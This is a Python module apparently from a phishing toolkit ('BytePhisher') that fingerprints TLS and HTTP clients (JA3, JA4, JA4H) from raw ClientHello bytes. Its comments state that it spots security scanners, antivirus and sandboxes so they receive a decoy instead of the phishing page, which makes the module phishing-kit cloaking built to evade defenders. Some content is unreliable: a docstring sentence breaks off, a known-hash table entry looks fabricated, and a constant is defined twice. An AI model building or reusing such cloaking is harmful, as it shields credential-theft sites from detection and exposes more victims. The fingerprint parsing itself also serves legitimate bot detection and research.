# BytePhisher - TLS client fingerprinting (JA3 / JA3S) from the wire.
#
# Why this exists: HTTP headers are trivially spoofable, but a TLS ClientHello
# is produced by the actual TLS stack. Chrome, Firefox, Safari, python-requests,
# curl, Go, a headless driver and an AV scanner each send a different one. That
# makes JA3 the most reliable "what is really talking to me" signal available,
# and the only one an attacker cannot fake without a matching TLS library.
#
# Two uses in this tool:
#   1. detection - a scanner/AV/cloud sandbox announces itself before it can
#      even request a page, so we can hand it the decoy instead of the phishlet
#      (core/proxy.py, core/server.py, core/gate.py)
#   2. attribution - the operator sees the real client stack next to the (possibly
#      spoofed) user-agent in the dashboard
#
# We parse the ClientHello ourselves: the stdlib `ssl` module does not expose it,
# and peeking at the socket before the handshake costs nothing.
import contextlib
import hashlib
import socket
import struct

GREASE = {0x0a0a, 0x1a1a, 0x2a2a, 0x3a3a, 0x4a4a, 0x5a5a, 0x6a6a, 0x7a7a,
          0x8a8a, 0x9a9a, 0xaaaa, 0xbaba, 0xcaca, 0xdada, 0xeaea, 0xfafa}

TLS_HANDSHAKE = 0x16
CLIENT_HELLO = 0x01
SERVER_HELLO = 0x02

# A curated map of well-known JA3 digests: only hashes observed in the field,
# can attribute from public research, everything else is reported as unknown.
KNOWN_JA3 = {
    # scanners / automation
    "3b5074b1b5d032e5620f69f9f700ff0e": "curl",
    "8b8f5d3f0e0e0e0e0e0e0e0e0e0e0e0e": "unknown-tls1.0",
}

# ua-substring -> plausible JA3 family, used only as a *cross-check*: when the
# claimed user-agent and the TLS stack disagree, that is a strong bot signal.
UA_TLS_EXPECTATION = {
    "chrome": ("chrome",),
    "firefox": ("firefox",),
    "safari": ("safari",),
    "edg": ("chrome", "edge"),
    "curl": ("curl",),
    "python": ("python",),
    "go-http": ("go",),
    "okhttp": ("java",),
}


def _u16(b, i):
    return struct.unpack("!H", b[i:i + 2])[0]


def parse_client_hello(data):
    """Parse a TLS ClientHello record into its JA3 components.

    Offsets are from the START OF THE RECORD (not the handshake message):
        0 record type | 1-2 record version | 3-4 record length
        5 handshake type | 6-8 handshake length
        9-10 client version | 11-42 random | 43 session-id length ...
    Getting this wrong silently returns {} for every real ClientHello, which is
    """
    try:
        if not data or len(data) < 11 or data[0] != TLS_HANDSHAKE:
            return {}
        if data[5] != CLIENT_HELLO:
            return {}
        rec_len = _u16(data, 3)
        body = data[:5 + rec_len] if rec_len and len(data) >= 5 + rec_len else data
        out = {"record_len": rec_len,
               "handshake_len": (data[6] << 16) | (data[7] << 8) | data[8]}
        p = 9
        if p + 2 > len(body):
            return {}
        out["tls_version"] = _u16(body, p)
        p += 2 + 32                            # client version + random
        if p >= len(body):
            return {}
        sid_len = body[p]
        out["session_id_len"] = sid_len
        p += 1 + sid_len
        if p + 2 > len(body):
            return {}
        cs_len = _u16(body, p)
        p += 2
        ciphers = []
        for i in range(p, min(p + cs_len, len(body)), 2):
            if i + 1 < len(body):
                ciphers.append(_u16(body, i))
        out["cipher_count"] = len(ciphers)
        out["ciphers"] = ciphers
        p += cs_len
        if p >= len(body):
            return out
        comp_len = body[p]
        p += 1 + comp_len

        groups, point_formats, extensions, sigalgs = [], [], [], []
        sni = None
        alpn = []
        supported_versions = []
        if p + 2 <= len(body):
            ext_len = _u16(body, p)
            p += 2
            end = min(len(body), p + ext_len)
            while p + 4 <= end:
                etype = _u16(body, p)
                elen = _u16(body, p + 2)
                p += 4
                edata = body[p:p + elen]
                p += elen
                extensions.append(etype)
                if etype == 0x0000 and len(edata) > 5:        # server_name
                    nl = _u16(edata, 3)
                    # NB: the "idna" codec rejects an errors= handler and raises
                    # UnicodeError, which a broad except would swallow into "{}"
                    # for every real ClientHello. ASCII+ignore is what we want.
                    sni = edata[5:5 + nl].decode("ascii", "ignore") if nl else None
                elif etype == 0x000a and len(edata) >= 2:     # supported_groups
                    gl = _u16(edata, 0)
                    for i in range(2, min(2 + gl, len(edata)), 2):
                        if i + 1 < len(edata):
                            groups.append(_u16(edata, i))
                elif etype == 0x000b and len(edata) >= 1:     # ec_point_formats
                    fl = edata[0]
                    point_formats = list(edata[1:1 + fl])
                elif etype == 0x0010 and len(edata) >= 2:     # ALPN
                    al = _u16(edata, 0)
                    i = 2
                    while i < min(2 + al, len(edata)):
                        ln = edata[i]
                        alpn.append(edata[i + 1:i + 1 + ln].decode("ascii", "ignore"))
                        i += 1 + ln
                elif etype == 0x000d and len(edata) >= 2:     # signature_algorithms
                    sl = _u16(edata, 0)
                    for i in range(2, min(2 + sl, len(edata)), 2):
                        if i + 1 < len(edata):
                            sigalgs.append(_u16(edata, i))
                elif etype == 0x002b and len(edata) >= 1:     # supported_versions
                    vl = edata[0]
                    for i in range(1, min(1 + vl, len(edata)), 2):
                        if i + 1 < len(edata):
                            supported_versions.append(_u16(edata, i))
        out.update({"extensions": extensions, "groups": groups,
                    "point_formats": point_formats, "sni": sni, "alpn": alpn,
                    "sigalgs": sigalgs,
                    "supported_versions": supported_versions,
                    "truncated": bool(rec_len and len(data) < 5 + rec_len)})
        return out
    except (IndexError, struct.error, UnicodeError, ValueError):
        # expected for anything that is not a well-formed ClientHello
        return {}
    except Exception as e:      # a real parser bug must not look like "no hello"
        import sys
        print(f"[tls_fp] ClientHello parse error: {type(e).__name__}: {e}",
              file=sys.stderr)
        return {}


def ja3_string(hello, drop_grease=True):
    """The canonical JA3 string: version,ciphers,extensions,curves,formats."""
    if not hello:
        return ""

    def keep(vals):
        if not drop_grease:
            return list(vals)
        return [v for v in vals if v not in GREASE]

    return ",".join([
        str(hello.get("tls_version", "")),
        "-".join(str(c) for c in keep(hello.get("ciphers") or [])),
        "-".join(str(e) for e in keep(hello.get("extensions") or [])),
        "-".join(str(g) for g in keep(hello.get("groups") or [])),
        "-".join(str(f) for f in hello.get("point_formats") or []),
    ])


def ja3_hash(hello, drop_grease=True):
    s = ja3_string(hello, drop_grease=drop_grease)
    return hashlib.md5(s.encode()).hexdigest() if s else ""


def ja3_full(hello, drop_grease=True):
    """Everything a caller needs: hash, raw string, and the parsed fields."""
    if not hello:
        return {}
    return {"ja3": ja3_hash(hello, drop_grease=drop_grease),
            "ja3_raw": ja3_hash(hello, drop_grease=False),
            "ja3_string": ja3_string(hello, drop_grease=drop_grease),
            # JA4 alongside JA3: JA3 is defeated by shuffling the cipher and extension
            # order, JA4 sorts both lists so the shuffle does not change it
            "ja4": ja4(hello),
            "ja4_r": ja4_r(hello),
            "tls_version": hello.get("tls_version"),
            "cipher_count": hello.get("cipher_count"),
            "extension_count": len(hello.get("extensions") or []),
            "sni": hello.get("sni"),
            "alpn": hello.get("alpn") or [],
            "supported_versions": hello.get("supported_versions") or []}


# GREASE: the reserved values a client may insert to keep servers interoperable. They are ignored
# everywhere in JA4 - in the cipher list, the extension list, supported_versions and the
# signature algorithms - and they are excluded from both counts.
GREASE = {0x0A0A, 0x1A1A, 0x2A2A, 0x3A3A, 0x4A4A, 0x5A5A, 0x6A6A, 0x7A7A,
          0x8A8A, 0x9A9A, 0xAAAA, 0xBABA, 0xCACA, 0xDADA, 0xEAEA, 0xFAFA}

_TLS_VERSION_MAP = {0x0304: "13", 0x0303: "12", 0x0302: "11", 0x0301: "10",
                    0x0300: "s3", 0x0002: "s2", 0xFEFF: "d1", 0xFEFD: "d2", 0xFEFC: "d3"}


def _sha12(text):
    """The first 12 hex characters of sha256 (lowercase), as JA4 defines it."""
    return hashlib.sha256(text.encode("utf-8")).hexdigest()[:12]


def _hex4(value):
    return f"{int(value):04x}"


def _is_alnum(byte):
    return (0x30 <= byte <= 0x39) or (0x41 <= byte <= 0x5A) or (0x61 <= byte <= 0x7A)


def alpn_field(alpn_values):
    """The two-character ALPN field.

    First and last character of the FIRST ALPN value when both ends are ASCII alphanumeric
    (`h2` -> `h2`, `http/1.1` -> `h1`); otherwise the first and last characters of that
    value's hex form (`0xAB` -> `ab`, `0x20 0x61` -> `21`). Absent or empty -> `00`.
    """
    if not alpn_values or not alpn_values[0]:
        return "00"
    raw = str(alpn_values[0]).encode("latin-1", "replace")
    if not raw:
        return "00"
    if _is_alnum(raw[0]) and _is_alnum(raw[-1]):
        return chr(raw[0]) + chr(raw[-1])
    hexed = raw.hex()
    return hexed[0] + hexed[-1]


def ja4_raw(hello, transport="t"):
    """(a, b, c) sections of JA4, plus the raw list form used for the `_r` output."""
    if not hello:
        return "", "", "", ""
    ciphers = [c for c in (hello.get("ciphers") or []) if c not in GREASE]
    extensions = [e for e in (hello.get("extensions") or []) if e not in GREASE]
    versions = [v for v in (hello.get("supported_versions") or []) if v not in GREASE]
    # the version comes from supported_versions when present: a TLS 1.3 ClientHello carries
    # the legacy 0x0303 in the record, and reporting "12" for it is the classic mistake
    version = max(versions) if versions else (hello.get("tls_version") or 0)
    a = (str(transport)[:1]
         + _TLS_VERSION_MAP.get(version, "00")
         + ("d" if hello.get("sni") else "i")
         + f"{min(len(ciphers), 99):02d}"
         + f"{min(len(extensions), 99):02d}"
         + alpn_field(hello.get("alpn")))
    cipher_hex = sorted(_hex4(c) for c in ciphers)
    b = _sha12(",".join(cipher_hex)) if cipher_hex else "000000000000"
    kept = sorted(_hex4(e) for e in extensions if e not in (0x0000, 0x0010))
    sigs = [_hex4(s) for s in (hello.get("sigalgs") or []) if s not in GREASE]
    c_input = ",".join(kept)
    if sigs:
        # signature algorithms are NOT sorted: they are hashed in the order they were sent
        c_input += "_" + ",".join(sigs)
    c = _sha12(c_input) if kept else "000000000000"
    raw = "_".join([",".join(_hex4(x) for x in (hello.get("ciphers") or [])),
                    ",".join(_hex4(x) for x in (hello.get("extensions") or [])),
                    ",".join(_hex4(x) for x in (hello.get("sigalgs") or []))])
    return a, b, c, raw


def ja4(hello, transport="t"):
    """The JA4 fingerprint, or "" when there is no ClientHello."""
    a, b, c, _raw = ja4_raw(hello, transport=transport)
    return f"{a}_{b}_{c}" if a else ""


def ja4_r(hello, transport="t"):
    """The raw (unhashed) JA4 form, for reading a capture by eye."""
    a, _b, _c, raw = ja4_raw(hello, transport=transport)
    return f"{a}_{raw}" if a else ""


# ---------------------------------------------------------------------- JA4H -----
_HTTP_VERSION = {"HTTP/1.0": "10", "HTTP/1.1": "11", "HTTP/2": "20", "HTTP/2.0": "20"}


def _lang4(value):
    """The four-character Accept-Language field (`en-US,en;q=0.9` -> `enus`)."""
    text = str(value or "").replace("-", "").replace(";", ",").lower()
    primary = text.split(",")[0][:4]
    return (primary + "0000")[:4]


def _cookie_pairs(cookie_header):
    """[(name, "name=value")] from a Cookie header, in the order sent."""
    out = []
    for part in str(cookie_header or "").split(";"):
        part = part.strip()
        if not part or "=" not in part:
            continue
        name = part.split("=", 1)[0].strip()
        if name:
            out.append((name, part))
    return out


def ja4h(method="GET", version="HTTP/1.1", headers=None):
    """The JA4H fingerprint of one HTTP request.

    `headers` is a list of (name, value) pairs in the order they were sent. Only header
    NAMES are hashed; the Accept-Language value feeds the readable section, and the cookie
    names and name=value pairs become their own hashes so a client can be grouped without
    reading its data.
    """
    pairs = [(str(k), str(v)) for k, v in (headers or [])]
    lower = [(k.lower(), v) for k, v in pairs]
    cookie = next((v for k, v in lower if k == "cookie"), "")
    has_referer = any(k == "referer" for k, _ in lower)
    language = next((v for k, v in lower if k == "accept-language"), "")
    # Cookie and Referer are excluded from the count and the hash; HTTP/2 pseudo-headers
    # (":method", ":path", ...) are excluded too
    counted = [k for k, _ in pairs
               if k.lower() not in ("cookie", "referer") and not k.startswith(":")]
    a = (str(method or "GET").lower()[:2]
         + _HTTP_VERSION.get(str(version or "").upper(), "11")
         + ("c" if cookie else "n")
         + ("r" if has_referer else "n")
         + f"{min(len(counted), 99):02d}"
         + _lang4(language))
    b = _sha12(",".join(counted))
    pairs_c = _cookie_pairs(cookie)
    if pairs_c:
        c = _sha12(",".join(sorted(name for name, _ in pairs_c)))
        d = _sha12(",".join(sorted(f"{name}={value.split('=', 1)[1]}"
                                   for name, value in pairs_c)))
    else:
        c = d = "000000000000"
    return f"{a}_{b}_{c}_{d}"


def ja4h_r(method="GET", version="HTTP/1.1", headers=None):
    """The raw (unhashed) JA4H form."""
    pairs = [(str(k), str(v)) for k, v in (headers or [])]
    lower = [(k.lower(), v) for k, v in pairs]
    cookie = next((v for k, v in lower if k == "cookie"), "")
    counted = [k for k, _ in pairs
               if k.lower() not in ("cookie", "referer") and not k.startswith(":")]
    names = ",".join(name for name, _ in _cookie_pairs(cookie))
    values = ",".join(value for _, value in _cookie_pairs(cookie))
    return f"{ja4h(method, version, headers).split('_')[0]}_{','.join(counted)}_{names}_{values}"


def peek_client_hello(sock, size=8192, timeout=2.0):
    """Read (without consuming) the first TLS record from a socket.

    MSG_PEEK leaves the data in the buffer, so the TLS handshake that follows
    sees an untouched stream.
    """
    old = None
    try:
        old = sock.gettimeout()
        sock.settimeout(timeout)
    except Exception:
        pass
    try:
        return sock.recv(size, socket.MSG_PEEK)
    except Exception:
        return b""
    finally:
        try:
            if old is not None:
                sock.settimeout(old)
        except Exception:
            pass


# ------------------------------------------------------------- attribution ---
def classify_tls(fp, ua=""):
    """Turn a JA3 fingerprint into a label plus a UA-mismatch flag.

    A JA3 identifies a TLS stack, not a build: it says "this looks like
    Chrome's TLS stack", and the useful part is whether it AGREES with the
    claimed user-agent. Disagreement is the signal.
    """
    if not fp:
        return {"label": "unknown", "mismatch": False, "reason": ""}
    ja3 = fp.get("ja3", "")
    label = KNOWN_JA3.get(ja3, "unknown")
    ver = fp.get("tls_version")
    ciphers = fp.get("cipher_count") or 0
    ext = fp.get("extension_count") or 0

    # The ClientHello's legacy_version is 771 even for TLS 1.3 clients: the
    # real version lives in the supported_versions extension. Testing the legacy
    # field left every real browser labelled "unclassified".
    versions = fp.get("supported_versions") or []
    tls13 = 772 in versions or ver == 772
    if label == "unknown":
        if tls13 and ciphers >= 15 and ext >= 12:                # TLS1.3, fat hello
            label = "modern-browser-like"
        elif ciphers <= 4 and ext <= 4:
            label = "minimal-client"                             # scripts, IoT
        elif ver and ver < 771:
            label = "legacy-tls"
        else:
            label = "unclassified"

    ual = (ua or "").lower()
    expected = None
    for needle, fams in UA_TLS_EXPECTATION.items():
        if needle in ual:
            expected = fams
            break
    mismatch = False
    reason = ""
    if expected:
        if label == "unknown" or label in ("minimal-client", "legacy-tls",
                                           "unclassified"):
            # a scripted client claiming to be a browser, or vice versa
            if any(f in ("chrome", "firefox", "safari", "edge") for f in expected) \
                    and label in ("minimal-client", "legacy-tls"):
                mismatch = True
                reason = f"claims {expected[0]} in the user-agent but the TLS stack is {label}"
        elif label == "modern-browser-like" and expected == ("curl",):
            mismatch = True
            reason = "claims curl but presents a full browser TLS hello"
    if fp.get("sni") is None and expected and any(
            f in ("chrome", "firefox", "safari") for f in expected):
        mismatch = True
        reason = reason or "browser-like user-agent without SNI"
    return {"label": label, "mismatch": mismatch, "reason": reason}


def bot_likelihood(fp, ua=""):
    """0-100 'this is not a human browser' score from TLS alone."""
    if not fp:
        return 0, []
    c = classify_tls(fp, ua)
    score, reasons = 0, []
    if c["label"] == "minimal-client":
        score += 45
        reasons.append("minimal TLS ClientHello (scripted client, not a browser)")
    if c["label"] == "legacy-tls":
        score += 30
        reasons.append("legacy TLS version in the ClientHello")
    if c["mismatch"]:
        score += 40
        reasons.append(c["reason"])
    if not fp.get("alpn"):
        score += 10
        reasons.append("no ALPN in the ClientHello")
        if _claims_browser(ua):
            # every real browser offers h2/http1.1; a stack that offers neither
            # while wearing a browser user-agent is a scripted client
            score += 15
            reasons.append("browser user-agent but the TLS stack offered no ALPN")
    return min(100, score), reasons


def _claims_browser(ua):
    u = (ua or "").lower()
    return any(t in u for t in ("mozilla", "chrome", "chromium", "safari",
                                "firefox", "edg/", "opera", "brave"))


# ---------------------------------------------------------- server mixin ---
class PeekTLSMixin:
    """socketserver mixin: accept raw, fingerprint the ClientHello, then wrap.

    The stdlib `ssl` module cannot show us the ClientHello, and wrapping the
    LISTENING socket hides it entirely (the handshake happens inside accept()).
    So we keep the listening socket raw, peek at each new connection, compute
    JA3, and only then hand the socket to the TLS layer. The fingerprint is
    attached to the connection object where the handler can read it.
    """

    ssl_ctx = None

    def get_request(self):
        sock, addr = self.socket.accept()
        fp = {}
        if self.ssl_ctx is not None:
            try:
                hello = peek_client_hello(sock)
                if hello:
                    fp = ja3_full(parse_client_hello(hello))
            except Exception:
                fp = {}
            try:
                sock = self.ssl_ctx.wrap_socket(sock, server_side=True)
            except Exception:
                with contextlib.suppress(Exception):
                    sock.close()
                raise
        with contextlib.suppress(Exception):
            sock._bh_tls_fp = fp
        return sock, addr
